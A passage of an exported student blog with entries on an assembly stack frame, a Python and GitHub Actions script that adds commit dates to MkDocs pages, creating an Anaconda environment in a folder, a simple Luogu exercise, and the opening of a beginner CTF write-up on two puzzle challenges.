<h3 id="栈帧图"><a href="#栈帧图" class="headerlink" title="栈帧图"></a>栈帧图</h3><div class="code-container" data-rel="Lua"><figure class="iseeu highlight lua"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">     ↑</span><br><span class="line">     |</span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     |            |    返回地址       |</span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     |            |                  |</span><br><span class="line">     |            |  保存的rbp值      |  ← rbp, rsp</span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     |            |                  |</span><br><span class="line">     |            |    局部变量       |</span><br><span class="line">     |            |    (<span class="number">10</span> 字节)      |</span><br><span class="line">     |            |                  |</span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     |            |                  |</span><br><span class="line">     |            |     参数空间      |  ← rsp (调用fun前)</span><br><span class="line">     |            |                  |</span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     |            |                  |</span><br><span class="line">     |            |     参数空间      |  ← rsp (fun内部)</span><br><span class="line">     |            |                  |</span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     ↓</span><br><span class="line">低地址</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="fun-函数"><a href="#fun-函数" class="headerlink" title="fun 函数"></a>fun 函数</h2><h3 id="汇编指令-1"><a href="#汇编指令-1" class="headerlink" title="汇编指令"></a>汇编指令</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/4/image-20240323213024282.png"
                      alt="image-20240323213024282"
                ></p>
<p>这段汇编指令表示一个简单的函数，它接受两个整数参数，并返回它们的和。</p>
<ol>
<li><p><code>push rbp</code>：保存调用该函数前的栈帧基址寄存器的值。</p>
</li>
<li><p><code>mov rbp, rsp</code>：将当前栈顶指针的值赋给栈帧基址寄存器，建立当前函数的栈帧。</p>
</li>
<li><p><code>mov [rbp+a], edi</code>：将第一个参数（a）存储到位于当前栈帧的偏移量 a 处的内存地址中。通常，函数的参数通过寄存器传递，edi 寄存器用于传递第一个整数参数。</p>
</li>
<li><p><code>mov [rbp+b], esi</code>：将第二个参数（b）存储到位于当前栈帧的偏移量 b 处的内存地址中。通常，函数的参数通过寄存器传递，esi 寄存器用于传递第二个整数参数。</p>
</li>
<li><p><code>mov edx, [rbp+a]</code>：将第一个参数（a）的值加载到 edx 寄存器中。</p>
</li>
<li><p><code>mov eax, [rbp+b]</code>：将第二个参数（b）的值加载到 eax 寄存器中。</p>
</li>
<li><p><code>add eax, edx</code>：将 edx 寄存器中的值和 eax 寄存器中的值相加，结果保存在 eax 寄存器中。这里计算了两个参数的和。</p>
</li>
<li><p><code>pop rbp</code>：恢复调用该函数前的栈帧基址寄存器的值。</p>
</li>
<li><p><code>retn</code>：函数返回指令，将控制流返回到调用该函数的地址处。</p>
</li>
</ol>
<p>这段代码的作用是接受两个整数参数，将它们相加，然后返回结果。</p>
<h3 id="栈帧图-1"><a href="#栈帧图-1" class="headerlink" title="栈帧图"></a>栈帧图</h3><div class="code-container" data-rel="Lua"><figure class="iseeu highlight lua"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">     ↑</span><br><span class="line">     |</span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     |            |    返回地址       |</span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     |            |                  |</span><br><span class="line">     |            |  保存的rbp值      |  ← rbp, rsp</span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     |            |                  |</span><br><span class="line">     |            |   参数 b 的值     |  ← rbp+<span class="number">8</span></span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     |            |                  |</span><br><span class="line">     |            |   参数 a 的值     |  ← rbp+<span class="number">0</span></span><br><span class="line">     |            +<span class="comment">------------------+</span></span><br><span class="line">     ↓</span><br><span class="line">低地址</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>讲解</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>A replacement method for inaccurate date display in Mkdocs-material</title>
    <url>/posts/fa88f28c.html</url>
    <content><![CDATA[<p>There is another Chinese translation for this article：<a href="https://blog.w1ndys.top/posts/512a6b20">https://blog.w1ndys.top/posts/512a6b20</a></p>
<p><font color="red">Note:</font>A more efficient approach:<a class="link"   href="https://github.com/squidfunk/mkdocs-material/discussions/7135#discussioncomment-9277842" >https://github.com/squidfunk/mkdocs-material/discussions/7135#discussioncomment-9277842<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="Question-background"><a href="#Question-background" class="headerlink" title="Question background."></a>Question background.</h2><p>After a deployment to Vercel, the date display was found to be inaccurate.</p>
<p>I asked the community for help, details can be seen: <a class="link"   href="https://github.com/squidfunk/mkdocs-material/discussions/6924/" >https://github.com/squidfunk/mkdocs-material/discussions/6924/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, finally found that Vercel does not support this operation, so after two weeks of testing, I found a replacement solution.</p>
<p>The specific idea is to add a text of time information at the bottom of each Markdown file, and use Python script + automated workflow to automatically update the date.<br>This scheme is suitable for:</p>
<ul>
<li><p>deploy to material sites on the Vercel platform.</p>
</li>
<li><p>document repository uses GitHub.</p>
</li>
<li><p>the submission record of the document repository is synchronized with the content of the document</p>
</li>
</ul>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Reference repository: <a class="link"   href="https://github.com/W1ndys/Easy-QFNU" >https://github.com/W1ndys/Easy-QFNU<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Python-script"><a href="#Python-script" class="headerlink" title="Python script"></a>Python script</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Constants</span></span><br><span class="line">modification_date_pattern = <span class="string">r&#x27;:material-clock-edit-outline:&#123; title=&quot;Modification date&quot; &#125; (\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)&#x27;</span></span><br><span class="line">creation_date_pattern = <span class="string">r&#x27;:material-clock-plus-outline:&#123; title=&quot;Creation date&quot; &#125; (\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the create and update time of the file from the repository</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_github_file_info</span>(<span class="params">repo_owner, repo_name, file_path, github_token</span>):</span><br><span class="line">    api_url = <span class="string">f&quot;https://api.github.com/repos/<span class="subst">&#123;repo_owner&#125;</span>/<span class="subst">&#123;repo_name&#125;</span>/commits?path=<span class="subst">&#123;file_path&#125;</span>&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;token <span class="subst">&#123;github_token&#125;</span>&quot;</span>&#125;</span><br><span class="line">    response = requests.get(api_url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        commits = response.json()</span><br><span class="line">        <span class="keyword">if</span> commits:</span><br><span class="line">            create_time = datetime.datetime.fromisoformat(</span><br><span class="line">                commits[-<span class="number">1</span>][<span class="string">&quot;commit&quot;</span>][<span class="string">&quot;committer&quot;</span>][<span class="string">&quot;date&quot;</span>].replace(<span class="string">&quot;Z&quot;</span>, <span class="string">&quot;+00:00&quot;</span>)</span><br><span class="line">            ).strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line">            update_time = datetime.datetime.fromisoformat(</span><br><span class="line">                commits[<span class="number">0</span>][<span class="string">&quot;commit&quot;</span>][<span class="string">&quot;committer&quot;</span>][<span class="string">&quot;date&quot;</span>].replace(<span class="string">&quot;Z&quot;</span>, <span class="string">&quot;+00:00&quot;</span>)</span><br><span class="line">            ).strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> create_time, update_time</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No submission record found for&quot;</span>, file_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR：<span class="subst">&#123;response.status_code&#125;</span> - <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the relative path of the file from the docs directory</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_relative_path_from_docs</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;docs/&quot;</span> + file_path.split(<span class="string">&quot;docs/&quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>] <span class="keyword">if</span> <span class="string">&quot;docs/&quot;</span> <span class="keyword">in</span> file_path <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Update the date of the Markdown file</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_markdown_files</span>(<span class="params">dir_path, exclude_paths, repo_owner, repo_name, github_token</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(dir_path):</span><br><span class="line">        dirs[:] = [d <span class="keyword">for</span> d <span class="keyword">in</span> dirs <span class="keyword">if</span> os.path.join(root, d) <span class="keyword">not</span> <span class="keyword">in</span> exclude_paths]</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            file_path = os.path.join(root, file)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Exclude files that do not need to be updated</span></span><br><span class="line">            <span class="keyword">if</span> file_path <span class="keyword">in</span> exclude_paths <span class="keyword">or</span> <span class="keyword">not</span> file.endswith(<span class="string">&quot;.md&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Skipping excluded file: <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            file_path = file_path.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>)  <span class="comment"># The path separator is unified as /</span></span><br><span class="line">            relative_path = get_relative_path_from_docs(file_path) <span class="comment"># Get the relative path of the file from the docs directory</span></span><br><span class="line">            <span class="keyword">if</span> relative_path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Skipping non-docs file: <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            create_time, update_time = get_github_file_info(</span><br><span class="line">                repo_owner, repo_name, relative_path, github_token</span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------------------------------------------&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Now processing file: <span class="subst">&#123;relative_path&#125;</span>\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Create date: <span class="subst">&#123;create_time&#125;</span>, Update date: <span class="subst">&#123;update_time&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Get the date information from the Markdown file of the repository</span></span><br><span class="line">            <span class="keyword">if</span> create_time <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> update_time <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span> No submission record found, skipping&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r+&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                lines = f.readlines()</span><br><span class="line">                <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines):</span><br><span class="line">                    line = line.strip()</span><br><span class="line">                    result = re.search(modification_date_pattern, line)</span><br><span class="line">                    <span class="keyword">if</span> result:</span><br><span class="line">                        current_date = result.groups(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">                        <span class="keyword">if</span> current_date == update_time:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span> The date is up to date.&quot;</span>)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            lines[i] = <span class="string">f&#x27;:material-clock-edit-outline:&#123;&#123; title=&quot;Modification date&quot; &#125;&#125; <span class="subst">&#123;update_time&#125;</span>\n&#x27;</span></span><br><span class="line">                            f.seek(<span class="number">0</span>)</span><br><span class="line">                            f.writelines(lines)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span> The date has been modified, and the modified date is: <span class="subst">&#123;update_time&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lines.append(<span class="string">f&#x27;\n\n---\n\n:material-clock-edit-outline:&#123;&#123; title=&quot;Modification date&quot; &#125;&#125; <span class="subst">&#123;update_time&#125;</span>\n:material-clock-plus-outline:&#123;&#123; title=&quot;Creation date&quot; &#125;&#125; <span class="subst">&#123;create_time&#125;</span>\n&#x27;</span>)</span><br><span class="line">                    f.seek(<span class="number">0</span>)</span><br><span class="line">                    f.writelines(lines)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span> No date, added&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------------------------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    docs_dir = os.path.join(os.getcwd(), <span class="string">&quot;docs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Exclude directories or files that do not need to be updated</span></span><br><span class="line">    exclude_paths = [</span><br><span class="line">        os.path.join(docs_dir, <span class="string">&quot;example_file.md&quot;</span>),</span><br><span class="line">        os.path.join(docs_dir, <span class="string">&quot;example_directory&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">    repo_owner = <span class="string">&quot;repo_owner&quot;</span> <span class="comment"># Change here to the owner of the repository</span></span><br><span class="line">    repo_name = <span class="string">&quot;repo_name&quot;</span> <span class="comment"># Change here to the name of the repository</span></span><br><span class="line"></span><br><span class="line">    github_token = os.environ.get(<span class="string">&quot;GITHUB_TOKEN&quot;</span>)</span><br><span class="line"></span><br><span class="line">    update_markdown_files(docs_dir, exclude_paths, repo_owner, repo_name, github_token)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="GitHub-Actions"><a href="#GitHub-Actions" class="headerlink" title="GitHub Actions"></a>GitHub Actions</h3><p>Use GitHub Actions to automate deployment and execute scripts automatically every time push arrives at the repository, at a fixed time, and when triggered manually.</p>
<div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Update-docs</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span> <span class="comment"># push to main branch</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&quot;0 17 * * *&quot;</span> <span class="comment"># Every day at 5:00 PM (UTC+8)</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">permissions:</span></span><br><span class="line">  <span class="attr">contents:</span> <span class="string">write</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">update-docs:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">Repository</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Set</span> <span class="string">up</span> <span class="string">Python</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-python@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">python-version:</span> <span class="string">&quot;3.11.4&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">requests</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Run</span> <span class="string">Python</span> <span class="string">script</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">python</span> <span class="string">update-docs.py</span> <span class="comment">#  Change here to the name of the Python script file</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Add</span> <span class="string">changes</span> <span class="string">to</span> <span class="string">git</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git add .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Commit</span> <span class="string">and</span> <span class="string">push</span> <span class="string">changes</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">stefanzweifel/git-auto-commit-action@v4</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">commit_message:</span> <span class="string">Update</span> <span class="string">docs</span> <span class="string">date</span> <span class="comment">#  Change here to the commit message</span></span><br></pre></td></tr></table></figure></div>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>The Python script is placed in the root directory of the Github repository and named <code>update-docs.py</code> (the name can be customized, but note that it also needs to be modified in the corresponding location of the workflow).</p>
<p>You need to modify the variables in the Python script to define your repository owner and repository name, and the script will get API based on this.</p>
<p>Other notes:<br>I come from China, my English level is not very good, some of the above documents are obtained through translation software, if there are any description errors, please forgive me, and point out the corrections in time.</p>
<h2 id="Acknowledgements"><a href="#Acknowledgements" class="headerlink" title="Acknowledgements"></a>Acknowledgements</h2><ol>
<li><p><a class="link"   href="https://squidfunk.github.io/mkdocs-material/" >Mkdocs-material<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Thanks to the developers of the framework</p>
</li>
<li><p><a class="link"   href="https://github.com/W1ndys" >W1ndys<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>My code ability is not high, with the help of ChatGPT, completed the implementation of this script, which really cost me too much time and energy, I want to thank myself</p>
</li>
<li><p><a class="link"   href="https://chat.openai.com/" >ChatGPT<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>A powerful language model for text generation, which can be used to generate text based on the input text, which is very useful for this script.</p>
</li>
</ol>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Mkdocs</tag>
        <tag>material</tag>
        <tag>Vercel</tag>
      </tags>
  </entry>
  <entry>
    <title>Anaconda如何在当前目录创建虚拟环境</title>
    <url>/posts/c85e665e.html</url>
    <content><![CDATA[<h1 id="Anaconda如何在当前目录创建虚拟环境"><a href="#Anaconda如何在当前目录创建虚拟环境" class="headerlink" title="Anaconda如何在当前目录创建虚拟环境"></a>Anaconda如何在当前目录创建虚拟环境</h1><p>要在当前文件夹中使用 Anaconda 创建虚拟环境，你需要执行以下步骤：</p>
<ol>
<li><p>打开命令行界面（例如，在 Windows 上使用命令提示符或在 macOS&#x2F;Linux 上使用终端）。</p>
</li>
<li><p>导航到你想要创建虚拟环境的文件夹。你可以使用 <code>cd</code> 命令（change directory）来实现这一点。例如：</p>
<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="built_in">path</span>/to/your/folder</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>一旦你在正确的文件夹中，使用以下命令创建虚拟环境：</p>
<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">conda create --prefix ./myenv python=<span class="number">3</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure></div>
<p>这将在当前文件夹中创建一个名为 <code>myenv</code> 的虚拟环境，并将其与 Python 3.8 关联起来。你可以将 <code>myenv</code> 替换为你想要的任何环境名称。</p>
</li>
<li><p>激活虚拟环境。在 Windows 上，使用：</p>
<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">.\myenv\Scripts\activate</span><br></pre></td></tr></table></figure></div>
<p>在 macOS&#x2F;Linux 上，使用：</p>
<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">source myenv/bin/activate</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>当你完成工作后，可以使用 <code>deactivate</code> 命令来退出虚拟环境。</p>
</li>
</ol>
<p>这样，你就可以在当前文件夹中成功创建并使用 Anaconda 虚拟环境了。</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>Anaconda</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Anaconda</tag>
      </tags>
  </entry>
  <entry>
    <title>B2005 字符三角形</title>
    <url>/posts/a7f00154.html</url>
    <content><![CDATA[<h1 id="字符三角形"><a href="#字符三角形" class="headerlink" title="字符三角形"></a>字符三角形</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定一个字符，用它构造一个底边长 $5$ 个字符，高 $3$ 个字符的等腰字符三角形。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入只有一行，包含一个字符。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>该字符构成的等腰三角形，底边长 $5$ 个字符，高 $3$ 个字符。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">*</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">*</span><br><span class="line"> ***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>对于 $100 %$ 的数据，输入的字符是 ASCII 中的可见字符。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;a&#125;</span>  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;a*<span class="number">3</span>&#125;</span> &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a*<span class="number">5</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>今天随便一刷，看到了一个很简单的题目，但是知识点值得学一下</p>
<ul>
<li>print 的格式化输出</li>
</ul>
<p>在 Python 中，<code>f</code> 字符串（格式化字符串）是一种特殊的字符串，它允许在字符串中嵌入表达式。当你在字符串前面加上 <code>f</code> 或 <code>F</code>，Python 会解析该字符串并在其中查找花括号 <code>&#123;&#125;</code> 内的表达式，并将其替换为其值。这使得在字符串中嵌入变量、表达式或函数调用变得更加方便。</p>
<p>例如，在上面的代码中，<code>f&quot;&#123;a* 3&#125;&quot;</code> 中的 <code>&#123;a* 3&#125;</code> 将被替换为 <code>char</code> 变量的值乘以 3。这使得打印输出变得更加灵活和动态。</p>
<ul>
<li>还有 strip 函数的用法</li>
</ul>
<p><code>strip()</code> 是一个字符串方法，它用于去除字符串两端的空白字符（空格、制表符、换行符等）。如果不提供任何参数，<code>strip()</code> 方法将默认去除字符串两端的空白字符。</p>
<p>例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;  Hello, World!  &quot;</span></span><br><span class="line"><span class="built_in">print</span>(s.strip())  <span class="comment"># 输出: &quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>在输入处理中，<code>strip()</code> 方法通常用于去除用户输入的多余空白，确保输入的字符串不包含额外的空格或换行符，使得后续处理更加方便。</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>BeginCTF（新生赛道）部分wp</title>
    <url>/posts/c4767082.html</url>
    <content><![CDATA[<p>菜鸡呜呜呜，就写了两道题</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="real-check-in"><a href="#real-check-in" class="headerlink" title="real check in"></a>real check in</h2><p>base32 秒了</p>
<h2 id="Tupper"><a href="#Tupper" class="headerlink" title="Tupper"></a>Tupper</h2><p>搜一下题目名字</p>
<p>可以搜到这篇文章</p>
<p><a class="link"   href="https://hasegawaazusa.github.io/tupper-note.html#/" >https://hasegawaazusa.github.io/tupper-note.html#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>结合题目</p>
<p>用脚本把文件内容拼一下</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前目录</span></span><br><span class="line">current_directory = os.getcwd()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个新的txt文件来存储汇总内容</span></span><br><span class="line">output_file_path = os.path.join(current_directory, <span class="string">&#x27;汇总文件.txt&#x27;</span>)</span><br><span class="line">output_file = <span class="built_in">open</span>(output_file_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历当前目录下以4的倍数命名的txt文件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">673</span>, <span class="number">4</span>):</span><br><span class="line">    file_name = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.txt&#x27;</span></span><br><span class="line">    file_path = os.path.join(current_directory, file_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(file_path):</span><br><span class="line">        <span class="comment"># 读取文件内容并写入汇总文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> input_file:</span><br><span class="line">            content = input_file.read()</span><br><span class="line">            output_file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭输出文件</span></span><br><span class="line">output_file.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;汇总完成，结果存储在 <span class="subst">&#123;output_file_path&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>得到字符串</p>
<blockquote>
